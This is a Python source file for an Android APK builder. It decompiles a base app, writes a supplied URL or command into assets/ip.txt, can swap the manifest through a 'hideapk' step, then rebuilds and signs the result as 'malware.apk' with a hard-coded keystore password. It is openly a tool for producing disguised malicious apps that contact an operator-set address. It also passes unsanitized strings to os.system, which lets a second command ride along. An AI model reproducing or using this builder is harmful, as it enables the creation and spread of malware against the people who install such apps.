from modules import colors
import os
import subprocess
class builder:
    def __init__(self):
        self.color=colors.color()
        self.info = f"[{self.color.BLUE}info{self.color.NONE}]"
        self.worn = f"[{self.color.YELLOW}worn{self.color.NONE}]"
        self.error = f"[{self.color.RED}error{self.color.NONE}]"

    def shell(self,command):
        os.system(f"{command} > /dev/null")

    def hideapk(self):
        self.shell("rm -rf base_mod/AndroidManifest.xml")
        self.shell("cp -r src/xml/AndroidManifest.xml base_mod")
    def CommandWriter(self,command,is_hide):
        if(is_hide):
            self.hideapk()
        self.shell("rm -rf base_mod/assets/ip.txt")
        with open("base_mod/assets/ip.txt",'w') as f:
            f.write(command)
            f.close()


    def rebuild(self,output):
        self.shell(f"apktool b base_mod -o {output}")
        self.shell("rm -rf base_mod")

    def signapk(self):
        self.shell("jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore src/key.keystore malware.apk hola -storepass iamhola")


    def build(self,url,output,is_hide):
        print(f"{self.info} {self.color.GREEN}Decompile src/base_mod.apk{self.color.NONE}")
        self.shell("apktool d src/base_mod.apk")
        print(f"{self.info} {self.color.GREEN}Configure apk{self.color.NONE}")
        self.CommandWriter(url,is_hide)
        print(f"{self.info} {self.color.GREEN}Recompile apk{self.color.NONE}\033[93m")
        self.rebuild(output)
        print(f"\033[0m{self.info} {self.color.GREEN}Signing apk{self.color.NONE}")
        self.signapk()
        print(f"{self.info} {self.color.GREEN}apk name {output}{self.color.NONE}")

